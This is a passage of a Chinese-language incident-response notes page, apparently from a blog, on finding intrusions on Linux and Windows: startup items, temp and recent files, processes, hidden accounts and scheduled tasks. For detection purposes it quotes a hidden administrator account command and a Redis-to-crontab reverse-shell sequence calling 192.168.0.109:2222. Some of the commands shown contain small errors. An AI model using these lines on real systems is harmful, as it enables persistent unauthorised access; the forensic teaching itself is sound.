+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>在Linux（Debian）系统中/etc/init.d目录下保存着开机自启动程序的目录</p>
+<p>用户可以直接使用/etc/init.d 程序名称 status查看状态</p>
+<p>使用==<strong>update-rc.d</strong>==程序名称disable取消开机自启动</p>
+<h6 id="path变量异常" class="heading-element"><span>0.0.0.1.7  $PATH变量异常</span>
+  <a href="#path%e5%8f%98%e9%87%8f%e5%bc%82%e5%b8%b8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>决定了shell将到哪些目录中寻找命令或程序，PATH的值是一系列目录，当你运行一个程序时，Linux在这些目录下进行搜寻编译链接。</p>
+<p>修改PATH export PATH=$PATH:/usr/locar/new/bin 本次终端中有效，重启后无效</p>
+<p>在/etc/profile或/home/.bashrc(source ~/.bashrc)才能永久生效</p>
+<h6 id="后门排查---rkhunter" class="heading-element"><span>0.0.0.1.8  后门排查 - rkhunter</span>
+  <a href="#%e5%90%8e%e9%97%a8%e6%8e%92%e6%9f%a5---rkhunter" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>rkhunter具有以下功能：</p>
+<ol>
+<li>系统命令检测，MD5校验</li>
+<li>Rockit检测</li>
+<li>本机敏感目录，系统配置异常检测</li>
+</ol>
+<p>安装：apt install rkhunter</p>
+<p>基本使用：rkhunter –check -sk</p>
+<h5 id="windows分析排查" class="heading-element"><span>0.0.0.2  Windows分析排查</span>
+  <a href="#windows%e5%88%86%e6%9e%90%e6%8e%92%e6%9f%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><h6 id="文件分析-1" class="heading-element"><span>0.0.0.2.1  文件分析</span>
+  <a href="#%e6%96%87%e4%bb%b6%e5%88%86%e6%9e%90-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>####### 开机启动文件</p>
+<p>在Windows系统中通过以下三方面查看开机启动项</p>
+<ol>
+<li>
+<p>利用操作系统中的启动菜单</p>
+<p>C:/users/Administrator(<em>当前用户名</em>)/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup</p>
+</li>
+<li>
+<p>利用系统配置msconfig</p>
+</li>
+<li>
+<p>利用注册表regedit</p>
+<p>HKEY_CURRENT_USERS/software/Microsoft/Windows/CurrentVersion/Run</p>
+</li>
+</ol>
+<p>####### temp临时异常文件</p>
+<p>temp（临时文件夹），位于C:/Documents and Settings/Administrator/Local Settings內。很多临时文件放在这里，用来收藏夹，浏览网页的临时文件，编辑文件等。</p>
+<p>使用运行 &gt; 输入%temp% 可以直接打开temp文件夹</p>
+<p>查看temp文件发现PE文件（exe、dll、sys），或者是否具有特别大的tmp文件</p>
+<p>将文件上传至在线沙盒检测是否为恶意代码</p>
+<p>####### 浏览器信息分析</p>
+<p>在被黑客拿下的服务器，很有可能会使用浏览器进行网站的访问。因此我们可以查看浏览器记录查看、探索浏览器是否被使用下载恶意代码</p>
+<p>浏览器浏览痕迹查看</p>
+<p>浏览器文件下载记录查看</p>
+<p>浏览器cookie信息查看</p>
+<p>####### 文件时间属性分析</p>
+<p>在Windows系统下，文件属性的时间属性具有：创建时间，修改时间，访问时间（默认情况下禁用）。在默认情况下，计算机是以修改时间作为展示。</p>
+<p>如果修改时间早于创建时间则这个文件存在很大的嫌疑。</p>
+<p>####### 最近打开文件分析</p>
+<p>Windows系统中默认记录系统中最近打开使用的文件信息</p>
+<p>可以在目录C:/Documents and Settings/Administrator/Recent下查看，也可以使用运行 &gt; 输入%UsersProfile%\Recent查看。然后利用Windows中的筛选条件查看具体时间范围的文件</p>
+<h6 id="进程分析-1" class="heading-element"><span>0.0.0.2.2  进程分析</span>
+  <a href="#%e8%bf%9b%e7%a8%8b%e5%88%86%e6%9e%90-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>####### 可疑进程发现与关闭</p>
+<p>计算机与外部网络通信是建立在TCP或UDP协议上的，并且每一次通信都是通过不同的端口。如果计算机被木马入侵后，肯定会与外部网络通信，那么此时就可以通过查看网络连接状态，找到对应的进程ID，然后关闭进程ID就可以关闭连接状态</p>
+<ul>
+<li>netstat -ano | find “ESTABLISHED” 查看网络建立连接状态</li>
+<li>Tasklist /svc | find “PID” 查看具体PID进程对应的程序</li>
+<li>tasklist /PID <em>pid值</em> /T 关闭进程</li>
+</ul>
+<h6 id="系统信息" class="heading-element"><span>0.0.0.2.3  系统信息</span>
+  <a href="#%e7%b3%bb%e7%bb%9f%e4%bf%a1%e6%81%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>####### Windows计划任务</p>
+<p>在计算机中可以通过设定计划任务，在固定的时间执行固定操作。一般情况下，恶意代码也有可能在固定的时间执行。</p>
+<p>使用at命令可以对计划任务进行管理，直接输入at可以查看当前计算机中保存的计划任务，也可以在可视化的计划任务管理中进行。</p>
+<p>####### 隐藏账号发现与删除</p>
+<p>隐藏账号是指“黑客”在入侵之后为了能够持久保持对计算机访问，而在计算机系统中建立的不轻易被发现的计算机账户。</p>
+<p>最为简单的隐藏账户建立：==<strong>net user test$ test /add &amp;&amp; net local group administrator test$ /add</strong>==，其中¥符号可以导致系统管理员在使用net user时无法查看到test$用户。</p>
+<p>####### 补丁查看与更新</p>
+<p>Windows系统支持补丁以修补漏洞，可以使用systeminfo查看系统信息，并展示对应的系统补丁信息编号。也可以卸载软件中查看系统补丁和第三方软件补丁。</p>
+<p>控制面板&gt;程序&gt;程序和功能&gt;已安装更新</p>
+<h6 id="恶意进程" class="heading-element"><span>0.0.0.2.4  恶意进程</span>
+  <a href="#%e6%81%b6%e6%84%8f%e8%bf%9b%e7%a8%8b" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>####### 发现与关闭</p>
+<p>恶意代码在Windows系统运行过程中，将以进程的方式进行展示。其中恶意进程执行着各种恶意行为。对于可执行程序，可以直接使用杀毒软件进行查杀，但是并非所有的恶意程序能够被查杀。此时可以通过手动查杀，使用工具psexplore，然后利用在线沙盒进行分析。对恶意程序相关的服务进行关闭。</p>
+<h6 id="日志分析" class="heading-element"><span>0.0.0.2.5  日志分析</span>
+  <a href="#%e6%97%a5%e5%bf%97%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><h5 id="文件分析-2" class="heading-element"><span>0.0.0.3  文件分析</span>
+  <a href="#%e6%96%87%e4%bb%b6%e5%88%86%e6%9e%90-2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><h6 id="windows" class="heading-element"><span>0.0.0.3.1  windows</span>
+  <a href="#windows" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><ul>
+<li>
+<p>（1）各个盘下的temp相关目录%temp% （判别恶意文件放在云沙箱）</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404071746990.webp" alt="image-20240407174644821" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404071746990.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404071746990.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404071746990.webp?size=large 2x" data-title="image-20240407174644821" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+</li>
+<li>
+<p>（2）开机启动文件（启动菜单、注册表）</p>
+</li>
+<li>
+<p>（3）浏览器的历史记录</p>
+</li>
+<li>
+<p>（4）Recent文件</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404071747997.webp" alt="image-20240407174713854" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404071747997.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404071747997.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404071747997.webp?size=large 2x" data-title="image-20240407174713854" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+</li>
+<li>
+<p>（5）攻击日期内新增的文件
+<code>【forfiles /m *.exe /d 2023/2/5 /s /c &quot;cmd /c echo @path @fdate @ftime&quot;】（根据当时具体情况排查）也可以通过everything排查位置</code></p>
+</li>
+<li>
+<p>(6)使用工具D盾、HwsKill、WebshellKill等</p>
+</li>
+</ul>
+<h6 id="linux-1" class="heading-element"><span>0.0.0.3.2  linux</span>
+  <a href="#linux-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><pre tabindex="0"><code>检查异常系统文件
+find / -uid 0 -perm -4000 -print
+find / -size +10000k -print
+find / -name &#34;…&#34;-print</code></pre><p>last</p>
+<pre tabindex="0"><code>last 命令用于显示用户最近登录信息。
+
+单独执行 last 指令，它会读取位于 /var/log/目录下，名称为 wtmp 的文件，并把该文件记录登录的用户名，全部显示出来。
+
+语法
+last [options] [username...] [tty...]
+参数说明：
+
+options:
+
+-R 省略主机名 hostname 的列
+-a 　把从何处登入系统的主机名称或IP地址显示在最后一行。
+-d 　将IP地址转换成主机名称。
+-f&lt;记录文件&gt; 　指定记录文件。
+-n&lt;显示行数&gt;或-&lt;显示行数&gt; 　显示名单的行数。
+-R 　不显示登入系统的主机名称或IP地址。
+-x 　显示系统关机，重新开机，以及执行等级的改变等信息。</code></pre><h5 id="进程分析-2" class="heading-element"><span>0.0.0.4  进程分析</span>
+  <a href="#%e8%bf%9b%e7%a8%8b%e5%88%86%e6%9e%90-2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><h6 id="windows-1" class="heading-element"><span>0.0.0.4.1  windows</span>
+  <a href="#windows-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>（tasklist列出所有进程 思路：恶意文件会进行外连，我们去查看网络连接；netstat -a查看网络连接，也可以用netstat -ano查看它的PID;查看端口得到PID,然后根据PID查看进程对应的程序名称,得到程序全路径名,杀掉进程）</p>
+<p>（1）查看端口得到PID</p>
+<pre tabindex="0"><code>netstat -nao | findstr 端口</code></pre><p>（2）根据PID查看进程对应的程序名称</p>
+<pre tabindex="0"><code>tasklist /V | findstr PID
+wmic process list brief | findstr PID</code></pre><p>（3）得到程序全路径名</p>
+<pre tabindex="0"><code>wmic process where processid=PID get processid,executablepath,name</code></pre><p>（4）杀掉进程</p>
+<pre tabindex="0"><code>taskkill /PID 1437 /F
+或者 wmic process where name=&#34;mysqld.exe&#34; delete
+或者 wmic process where processid=1437 call terminate</code></pre><h6 id="linux-2" class="heading-element"><span>0.0.0.4.2  linux</span>
+  <a href="#linux-2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><pre tabindex="0"><code>进程和网络连接状态
+网络连接命令【netstat】
+-napt -pantn -a显示所有的选项 -n别名 -t tcp的连接
+查看隐藏进程
+ps -ef|awk &#39;{print}&#39;| sort -n |uniq &gt;1
+ls /proc| sort -n |uniq &gt;2</code></pre><h5 id="新增隐藏账号排查" class="heading-element"><span>0.0.0.5  新增隐藏账号排查</span>
+  <a href="#%e6%96%b0%e5%a2%9e%e9%9a%90%e8%97%8f%e8%b4%a6%e5%8f%b7%e6%8e%92%e6%9f%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><pre tabindex="0"><code>1.通过命令:“net user”查看
+2.通过“计算机管理”查看。lusrmgr.msc
+3.通过Windows安全日志进行排查 eventvwr
+4.通过查看注册表文件进行排查 regedit
+打开注册表以后我们进行隐藏账号排查排查，打不开它的下一级目录那么在编辑里面权限改为SYStem权限</code></pre><h5 id="自启动排查" class="heading-element"><span>0.0.0.6  自启动排查</span>
+  <a href="#%e8%87%aa%e5%90%af%e5%8a%a8%e6%8e%92%e6%9f%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>打开注册表以后我们进行自启动排查</p>
+<h5 id="计划任务排查" class="heading-element"><span>0.0.0.7  计划任务排查</span>
+  <a href="#%e8%ae%a1%e5%88%92%e4%bb%bb%e5%8a%a1%e6%8e%92%e6%9f%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><pre tabindex="0"><code>schtasks.exe
+
+
+linu
+检查系统计划任务
+/var/spool/cron/crontabs/root
+crontab -u root -l
+cat /etc/rc.d/rc.local
+ls /etc/rc3.d
+redis写隐藏计划任务
+set shell &#34;\n\n/1 * /bin/bash -
+i&gt;&amp;/dev/tcp/192.168.0.109/2222 0&gt;&amp;1\n\n&#34;
+config set dir /var/spool/cron/
+config set dbfilename root
+save
+我们要查看 cd /var/spool/cron/root 去排查</code></pre><h5 id="排查工具" class="heading-element"><span>0.0.0.8  排查工具</span>
+  <a href="#%e6%8e%92%e6%9f%a5%e5%b7%a5%e5%85%b7" class="heading-mark">
